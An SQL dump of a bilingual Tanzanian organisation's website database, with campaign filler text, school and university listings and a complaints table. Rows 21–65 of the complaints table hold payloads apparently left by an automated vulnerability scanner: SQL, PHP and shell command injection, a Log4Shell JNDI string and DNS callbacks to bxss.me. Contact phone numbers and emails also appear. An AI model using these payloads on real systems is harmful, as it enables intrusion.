Ipsum.</p>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.&nbsp;<strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>', NULL, NULL, NULL, NULL, NULL, 1, 'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc-5', '2021-11-23 03:44:12', '2021-11-23 03:44:12');

-- --------------------------------------------------------

--
-- Table structure for table `backgrounds`
--

CREATE TABLE `backgrounds` (
  `id` int(11) NOT NULL,
  `main_bg` varchar(255) NOT NULL,
  `banner_bg` varchar(255) NOT NULL,
  `second_bg` varchar(255) DEFAULT NULL,
  `user_id` int(11) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `backgrounds`
--

INSERT INTO `backgrounds` (`id`, `main_bg`, `banner_bg`, `second_bg`, `user_id`, `created_at`, `updated_at`) VALUES
(8, '/uploads/backgrounds/1666067134-desola-lanre-ologun-IgUR1iX0mqM-unsplash.jpg', '', NULL, 1, '2022-10-18 01:25:34', '2022-10-18 01:25:34');

-- --------------------------------------------------------

--
-- Table structure for table `campaigns`
--

CREATE TABLE `campaigns` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `icon` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `color` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `specials` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `campaigns`
--

INSERT INTO `campaigns` (`id`, `title_sw`, `title_en`, `summary_sw`, `summary_en`, `content_sw`, `content_en`, `photo_url`, `active`, `slug`, `created_at`, `updated_at`, `user_id`, `icon`, `color`, `specials`) VALUES
(1, 'Real Possibilities on Enhancement of the Achievable Estimates', 'Real Possibilities on Enhancement of the Achievable Estimates', NULL, NULL, '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '5f0814d557088a67edbbe7b8a2ea1fa5.jpeg', 1, 'real-possibilities-on-enhancement-of-the-achievable-estimates', '2021-08-02 04:59:37', '2022-03-07 08:08:30', 0, 'icon-1646651310', NULL, NULL),
(2, 'Real Possibilities on Enhancement of the Achievable Estimates', 'Real Possibilities on Enhancement of the Achievable Estimates', NULL, NULL, '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '19c85af6feaf700d95b0653f677ebdf9.jpeg', 0, 'real-possibilities-on-enhancement-of-the-achievable-estimates-2', '2021-08-02 05:00:05', '2022-03-07 08:08:06', 0, 'icon-1646651286', NULL, NULL),
(3, 'Real Possibilities on Enhancement of the Achievable Estimates', 'Real Possibilities on Enhancement of the Achievable Estimates', NULL, NULL, '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', 'e153ca773f33545712009cb3b44d8680.jpeg', 1, 'real-possibilities-on-enhancement-of-the-achievable-estimates-3', '2021-08-02 05:03:54', '2022-03-07 08:07:48', 0, 'icon-1646651268', NULL, NULL),
(4, 'Real Possibilities on Enhancement of the Achievable Estimates', 'Real Possibilities on Enhancement of the Achievable Estimates', NULL, NULL, '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>', '93179b6450b24999094300288cd655a4.jpeg\n', 1, 'real-possibilities-on-enhancement-of-the-achievable-estimates-4', '2021-08-02 05:05:24', '2022-03-07 08:07:34', 0, 'icon-1646651254', NULL, NULL),
(5, 'Demo', 'Demo', NULL, NULL, '<p>Demo</p>', '<p>Demo</p>', 'f7c20b6f413b5930a0c4321b4994cef3.jpeg', 1, 'demo', '2021-09-11 09:24:32', '2022-06-21 16:27:10', 0, 'icon-1646651240', NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `colateral_managers`
--

CREATE TABLE `colateral_managers` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `address` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `colateral_managers`
--

INSERT INTO `colateral_managers` (`id`, `name`, `phone`, `email`, `address`, `active`, `slug`, `created_at`, `updated_at`) VALUES
(1, 'good berter', '07854121542', 'engotheta@gmail.com', 'P.0 58725', 1, 'winner-winei', '2022-06-30 20:58:30', '2022-06-30 21:00:01'),
(2, 'winner winei', '07854121542', 'engotheta@gmail.com', 'P.0 58725', 1, 'winner-winei-2', '2022-06-30 20:59:42', '2022-06-30 20:59:42');

-- --------------------------------------------------------

--
-- Table structure for table `communities`
--

CREATE TABLE `communities` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `telephone` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `region` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `country` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `address` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `website` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `category_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `communities`
--

INSERT INTO `communities` (`id`, `name`, `phone`, `telephone`, `email`, `region`, `country`, `address`, `website`, `active`, `slug`, `photo_url`, `category_id`, `created_at`, `updated_at`) VALUES
(1, 'Royola High School', '0692261066', NULL, NULL, 'Dar es salaam', NULL, '', NULL, 1, 'royola-high-school', '/uploads/communities/1665854633-nubelson-fernandes-gTs2w7bu3Qo-unsplash.jpg', 1, '2022-10-15 13:50:56', '2022-10-15 14:23:53'),
(2, 'St Joseph\'s Cathedral', '0754782563', NULL, NULL, 'Dar es salaam', NULL, '', NULL, 1, 'st-joseph-s-cathedral', '/uploads/communities/1665854989-blake-connally-B3l0g6HLxr8-unsplash.jpg', 1, '2022-10-15 14:29:49', '2022-10-15 14:29:49'),
(3, 'Alpha High School', '0754782563', NULL, NULL, 'Dar es salaam', NULL, '', NULL, 1, 'alpha-high-school', '/uploads/communities/1665855033-emile-perron-xrVDYZRGdw4-unsplash.jpg', 1, '2022-10-15 14:30:33', '2022-10-15 14:30:33'),
(4, 'University of Dar es Salaam', '0692261066', NULL, NULL, 'Dar es salaam', NULL, '', NULL, 1, 'university-of-dar-es-salaam', '/uploads/communities/1665855080-roman-synkevych-vXInUOv1n84-unsplash.jpg', 2, '2022-10-15 14:31:20', '2022-10-15 14:31:20'),
(5, 'University of Dodoma', '0692261066', NULL, NULL, 'Dar es salaam', NULL, '', NULL, 1, 'university-of-dodoma', '/uploads/communities/1665855106-kelly-sikkema--1_RZL8BGBM-unsplash.jpg', 2, '2022-10-15 14:31:46', '2022-10-15 14:31:46'),
(6, 'Mzumbe University', '0692261066', NULL, NULL, 'Dar es salaam', NULL, '', NULL, 1, 'mzumbe-university', '/uploads/communities/1665855133-lauren-mancke-aOC7TSLb1o8-unsplash.jpg', 2, '2022-10-15 14:32:13', '2022-10-15 14:32:13');

-- --------------------------------------------------------

--
-- Table structure for table `community_categories`
--

CREATE TABLE `community_categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `featured` tinyint(1) NOT NULL DEFAULT 0,
  `specials` int(11) DEFAULT NULL,
  `services` int(11) DEFAULT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `community_categories`
--

INSERT INTO `community_categories` (`id`, `title_sw`, `title_en`, `slug`, `active`, `created_at`, `updated_at`, `featured`, `specials`, `services`, `photo_url`) VALUES
(1, 'Schools', 'Schools', 'schools', 1, '2022-10-15 13:31:23', '2022-10-17 02:18:30', 0, NULL, NULL, '/uploads/communities/1665983909-desola-lanre-ologun-IgUR1iX0mqM-unsplash.jpg'),
(2, 'Universities', 'Universities', 'universities', 1, '2022-10-15 14:30:56', '2022-10-17 02:16:20', 0, NULL, NULL, '/uploads/communities/1665983780-honey-yanibel-minaya-cruz-laORtJZaieU-unsplash.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `complainants`
--

CREATE TABLE `complainants` (
  `id` int(10) UNSIGNED NOT NULL,
  `name_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `complaints`
--

CREATE TABLE `complaints` (
  `id` int(10) UNSIGNED NOT NULL,
  `first_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `middle_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `last_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `work` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `designation` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `organization` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `address` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `fax` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `customer_type` enum('Internal','External') COLLATE utf8mb4_unicode_ci NOT NULL,
  `complainant_id` int(11) NOT NULL,
  `grievance_level_id` int(11) NOT NULL,
  `subject` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `message` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `defect` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `location` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `date` date NOT NULL,
  `complained_before` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `email` text COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `complaints`
--

INSERT INTO `complaints` (`id`, `first_name`, `middle_name`, `last_name`, `work`, `designation`, `organization`, `address`, `phone`, `fax`, `customer_type`, `complainant_id`, `grievance_level_id`, `subject`, `message`, `defect`, `location`, `date`, `complained_before`, `created_at`, `updated_at`, `email`) VALUES
(19, 'Abraham', '', '', '', '', NULL, NULL, '07854121542', '', 'Internal', 0, 0, 'Help', 'help need immediately', '', '', '0000-00-00', 0, '2022-06-24 05:59:49', '2022-06-24 05:59:49', 'engotheta@gmail.com'),
(20, 'Abraham', '', '', '', '', NULL, NULL, '0754782563', '', 'Internal', 0, 0, 'Keeping all the coolnes', 'How does one keep all the coolness', '', '', '0000-00-00', 0, '2022-06-24 06:07:35', '2022-06-24 06:07:35', 'dfdfdf@wineer.om'),
(21, 'ncMUFCMU', '', '', '', '', 'response.write(9950892*9373120)', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:08', '2022-08-11 10:38:08', 'sample@email.tst'),
(22, 'http://bxss.me/t/fit.txt?.jpg', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:08', '2022-08-11 10:38:08', 'sample@email.tst'),
(23, '\'\"', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:08', '2022-08-11 10:38:08', 'sample@email.tst'),
(24, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '^(#$!@#$)(()))******', '', '', '0000-00-00', 0, '2022-08-11 10:38:08', '2022-08-11 10:38:08', 'sample@email.tst'),
(25, 'ncMUFCMU', '', '', '', '', '/xfs.bxss.me', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:08', '2022-08-11 10:38:08', 'sample@email.tst'),
(26, 'ncMUFCMU', '', '', '', '', '\'\"()', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:08', '2022-08-11 10:38:08', 'sample@email.tst'),
(27, 'ncMUFCMU', '', '', '', '', '12345\'\"\\\'\\\");|]*\0{\r\n<\0>', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:09', '2022-08-11 10:38:09', 'sample@email.tst'),
(28, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:09', '2022-08-11 10:38:09', 'sample@email.tst'),
(29, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '\".gethostbyname(lc(\"hitpi\".\"kfzdjnala50cb.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(113).chr(71).chr(101).chr(70).\"', '', '', '0000-00-00', 0, '2022-08-11 10:38:09', '2022-08-11 10:38:09', 'sample@email.tst'),
(30, 'ncMUFCMU', '', '', '', '', '1', NULL, '/xfs.bxss.me', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:09', '2022-08-11 10:38:09', 'sample@email.tst'),
(31, '<!--', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:09', '2022-08-11 10:38:09', 'sample@email.tst'),
(32, 'ncMUFCMU', '', '', '', '', '\'+response.write(9950892*9373120)+\'', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:09', '2022-08-11 10:38:09', 'sample@email.tst'),
(33, 'bxss.me', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:09', '2022-08-11 10:38:09', 'sample@email.tst'),
(34, 'ncMUFCMU', '', '', '', '', ')', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:10', '2022-08-11 10:38:10', 'sample@email.tst'),
(35, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '\'\"', '', '', '0000-00-00', 0, '2022-08-11 10:38:10', '2022-08-11 10:38:10', 'sample@email.tst'),
(36, 'complaints', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:10', '2022-08-11 10:38:10', 'sample@email.tst'),
(37, 'ncMUFCMU', '', '', '', '', '\'.gethostbyname(lc(\'hitpf\'.\'chxbxauc4d396.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(122).chr(82).chr(103).chr(71).\'', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:10', '2022-08-11 10:38:10', 'sample@email.tst'),
(38, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '/xfs.bxss.me', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:10', '2022-08-11 10:38:10', 'sample@email.tst'),
(39, 'ncMUFCMU', '', '', '', '', '\"+response.write(9950892*9373120)+\"', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:11', '2022-08-11 10:38:11', 'sample@email.tst'),
(40, '${j${::-n}di:dns${::-:}//hitwsmitvkkzzd33d7${::-.}bxss.me}zzzz', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:11', '2022-08-11 10:38:11', 'sample@email.tst'),
(41, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:11', '2022-08-11 10:38:11', '${@print(md5(31337))}'),
(42, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', 'http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg', '', '', '0000-00-00', 0, '2022-08-11 10:38:11', '2022-08-11 10:38:11', 'sample@email.tst'),
(43, 'ncMUFCMU', '', '', '', '', '1', NULL, '\'\"()', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:11', '2022-08-11 10:38:11', 'sample@email.tst'),
(44, 'ncMUFCMU', '', '', '', '', '!(()&&!|*|*|', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:12', '2022-08-11 10:38:12', 'sample@email.tst'),
(45, 'ncMUFCMU', '', '', '', '', '\".gethostbyname(lc(\"hitcn\".\"rumfvsowf3b72.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(102).chr(81).chr(122).chr(88).\"', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:12', '2022-08-11 10:38:12', 'sample@email.tst'),
(46, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '<!--', '', '', '0000-00-00', 0, '2022-08-11 10:38:12', '2022-08-11 10:38:12', 'sample@email.tst'),
(47, 'complaints', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:12', '2022-08-11 10:38:12', 'sample@email.tst'),
(48, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:12', '2022-08-11 10:38:12', 'sample@email.tst9379002'),
(49, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '1some_inexistent_file_with_long_name\0.jpg', '', '', '0000-00-00', 0, '2022-08-11 10:38:12', '2022-08-11 10:38:12', 'sample@email.tst'),
(50, 'echo ixcjwl$()\\ fmrixt\\nz^xyu||a #\' &echo ixcjwl$()\\ fmrixt\\nz^xyu||a #|\" &echo ixcjwl$()\\ fmrixt\\nz^xyu||a #', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:12', '2022-08-11 10:38:12', 'sample@email.tst'),
(51, '1tAzNBTrO', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:12', '2022-08-11 10:38:12', 'sample@email.tst'),
(52, 'ncMUFCMU', '', '', '', '', '^(#$!@#$)(()))******', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:13', '2022-08-11 10:38:13', 'sample@email.tst'),
(53, '\"+\"A\".concat(70-3).concat(22*4).concat(117).concat(69).concat(107).concat(74)+(require\"socket\"\nSocket.gethostbyname(\"hitjl\"+\"utoavvwc16755.bxss.me.\")[3].to_s)+\"', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:13', '2022-08-11 10:38:13', 'sample@email.tst'),
(54, ';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:13', '2022-08-11 10:38:13', 'sample@email.tst'),
(55, 'ncMUFCMU', '', '', '', '', '\'\"', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:13', '2022-08-11 10:38:13', 'sample@email.tst'),
(56, 'complaints/.', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:13', '2022-08-11 10:38:13', 'sample@email.tst'),
(57, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, 'response.write(9733618*9004926)', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:13', '2022-08-11 10:38:13', 'sample@email.tst'),
(58, 'HttP://bxss.me/t/xss.html?%00', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:13', '2022-08-11 10:38:13', 'sample@email.tst'),
(59, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', 'Http://bxss.me/t/fit.txt', '', '', '0000-00-00', 0, '2022-08-11 10:38:13', '2022-08-11 10:38:13', 'sample@email.tst'),
(60, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '\'\"()', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:14', '2022-08-11 10:38:14', 'sample@email.tst'),
(61, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '1lCkLncIO', '', '', '0000-00-00', 0, '2022-08-11 10:38:14', '2022-08-11 10:38:14', 'sample@email.tst'),
(62, '&echo fwhdwv$()\\ sitrde\\nz^xyu||a #\' &echo fwhdwv$()\\ sitrde\\nz^xyu||a #|\" &echo fwhdwv$()\\ sitrde\\nz^xyu||a #', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:14', '2022-08-11 10:38:14', 'sample@email.tst'),
(63, 'ncMUFCMU', '', '', '', '', '1', NULL, ')', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:14', '2022-08-11 10:38:14', 'sample@email.tst'),
(64, 'ncMUFCMU', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '\'.gethostbyname(lc(\'hitrg\'.\'raqyrxnp201d1.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(106).chr(78).chr(100).chr(67).\'', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:14', '2022-08-11 10:38:14', 'sample@email.tst'),
(65, '\';print(md5(31337));$a=\'', '', '', '', '', '1', NULL, '555-666-0606', '', 'Internal', 0, 0, '1', '555', '', '', '0000-00-00', 0, '2022-08-11 10:38:14', '2022-08-11 10:38:14', 'sample@email.tst'),
